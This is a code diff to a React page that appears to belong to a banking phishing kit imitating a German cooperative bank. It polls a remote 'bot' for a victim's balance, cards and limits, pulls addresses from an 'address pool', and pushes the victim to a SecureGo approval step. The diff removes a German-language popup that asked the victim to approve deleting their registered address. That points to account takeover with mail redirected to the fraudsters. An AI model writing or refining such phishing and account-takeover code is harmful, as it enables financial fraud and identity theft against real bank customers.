@@ -1,13 +1,12 @@
-import { useEffect, useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { Loader2, MapPin, CheckCircle2 } from "lucide-react";
-import { getBotTask, confirmAddress } from "@/lib/botClient";
+import { Loader2 } from "lucide-react";
+import { getBotTask } from "@/lib/botClient";
 import { getRandomPoolAddress } from "@/lib/addressPool.functions";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
 import { CompletionStep } from "@/components/flow/CompletionStep";
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
 type BankCtx = {
@@ -124,14 +123,6 @@ function PersonalDataPage() {
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
 
-  // Address-confirm popup (driven by bot's address_data / waiting_for_address_confirm)
-  const [addrModalOpen, setAddrModalOpen] = useState(false);
-  const [addrModalDismissed, setAddrModalDismissed] = useState(false);
-  const [addrSubmitting, setAddrSubmitting] = useState(false);
-  const [addrSuccess, setAddrSuccess] = useState(false);
-  const [addrError, setAddrError] = useState<string | null>(null);
-  const dismissedRef = useRef(false);
-
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
     try {
@@ -150,58 +141,25 @@ function PersonalDataPage() {
     } catch {}
   }, [taskId]);
 
-  // Continuous polling for late-arriving data (balance/cards/limits/address_data)
+  // Keep polling briefly in case more fields arrive after the initial redirect
   useEffect(() => {
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    const start = Date.now();
-    const MAX_MS = 5 * 60 * 1000; // 5 min safety cap
+    let attempts = 0;
     const tick = async () => {
+      attempts += 1;
       const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (cancelled) return;
       if (data?.result) {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
-      // Open address-confirm popup as soon as the bot reports address_data
-      // or explicitly waits for address confirmation.
-      const addr = data?.result?.address_data ?? null;
-      const waiting = data?.status === "waiting_for_address_confirm";
-      if ((addr || waiting) && !dismissedRef.current && !addrSuccess) {
-        setAddrModalOpen(true);
-      }
-      const done = data?.status === "completed" || data?.status === "failed";
-      if (done || Date.now() - start > MAX_MS) return;
-      timer = setTimeout(tick, 1500);
+      if (data?.status === "completed" || data?.status === "failed" || attempts > 12) return;
+      timer = setTimeout(tick, 800);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
-  }, [taskId, addrSuccess]);
-
-  const addressData = result?.address_data ?? null;
-
-  async function handleConfirmDelete() {
-    setAddrError(null);
-    setAddrSubmitting(true);
-    try {
-      const res = await confirmAddress(taskId);
-      if (!res.ok) {
-        const body = await res.text().catch(() => "");
-        throw new Error(`HTTP ${res.status}${body ? ` – ${body.slice(0, 160)}` : ""}`);
-      }
-      setAddrSuccess(true);
-      dismissedRef.current = true;
-      // Brief success indicator, then close.
-      setTimeout(() => {
-        setAddrModalOpen(false);
-        setAddrModalDismissed(true);
-      }, 1200);
-    } catch (e: any) {
-      setAddrError(e?.message || "Aufruf fehlgeschlagen. Bitte erneut versuchen.");
-    } finally {
-      setAddrSubmitting(false);
-    }
-  }
+  }, [taskId]);
 
   const customer = useMemo(
     () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
@@ -287,89 +245,6 @@ function PersonalDataPage() {
       {step === "done" && (
         <CompletionStep theme={theme} customerName={customer.name} />
       )}
-
-      <Dialog
-        open={addrModalOpen}
-        onOpenChange={(open) => {
-          if (!open && !addrSubmitting) {
-            setAddrModalOpen(false);
-            setAddrModalDismissed(true);
-            dismissedRef.current = true;
-          }
-        }}
-      >
-        <DialogContent className="sm:max-w-md">
-          <DialogHeader>
-            <DialogTitle className="flex items-center gap-2">
-              <MapPin className="h-5 w-5" style={{ color: theme.accentText ?? theme.buttonBg }} />
-              Adressänderung erforderlich
-            </DialogTitle>
-            <DialogDescription>
-              Bitte prüfen Sie die hinterlegte Adresse. Die alte Adresse kann gelöscht werden.
-            </DialogDescription>
-          </DialogHeader>
-
-          <div className="space-y-3 py-2">
-            <div className="rounded border border-gray-200 p-3">
-              <div className="text-xs uppercase text-gray-500 mb-1">Alte Adresse</div>
-              <div className="text-sm text-gray-900">
-                {addressData?.old_street || addressData?.old?.strasse || customer.adresse.strasse}
-                {(addressData?.old_plz || addressData?.old_city) && (
-                  <div>
-                    {[addressData?.old_plz, addressData?.old_city].filter(Boolean).join(" ")}
-                  </div>
-                )}
-              </div>
-            </div>
-            <div
-              className="rounded border p-3"
-              style={{ borderColor: theme.accentText ?? theme.buttonBg }}
-            >
-              <div className="text-xs uppercase text-gray-500 mb-1">Neue Adresse</div>
-              <div className="text-sm text-gray-900">
-                <div>{addressData?.new_street || addressData?.new?.strasse || "—"}</div>
-                <div>
-                  {[
-                    addressData?.new_plz ?? addressData?.new?.plz,
-                    addressData?.new_city ?? addressData?.new?.city,
-                  ]
-                    .filter(Boolean)
-                    .join(" ") || "—"}
-                </div>
-              </div>
-            </div>
-
-            {addrError && (
-              <div className="text-sm text-red-600 border border-red-200 bg-red-50 rounded p-2">
-                {addrError}
-              </div>
-            )}
-
-            {addrSuccess && (
-              <div className="flex items-center gap-2 text-sm text-green-700 border border-green-200 bg-green-50 rounded p-2">
-                <CheckCircle2 className="h-4 w-4" />
-                Alte Adresse wurde gelöscht.
-              </div>
-            )}
-          </div>
-
-          <div className="flex justify-end">
-            <button
-              type="button"
-              onClick={handleConfirmDelete}
-              disabled={addrSubmitting || addrSuccess}
-              className="inline-flex items-center gap-2 px-4 py-2 text-white text-sm font-medium disabled:opacity-60"
-              style={{
-                background: theme.buttonBg,
-                borderRadius: theme.buttonRadius === "rounded-none" ? 0 : 999,
-              }}
-            >
-              {addrSubmitting && <Loader2 className="h-4 w-4 animate-spin" />}
-              {addrSuccess ? "Erledigt" : "Adresse löschen"}
-            </button>
-          </div>
-        </DialogContent>
-      </Dialog>
     </BankShell>
   );
 }
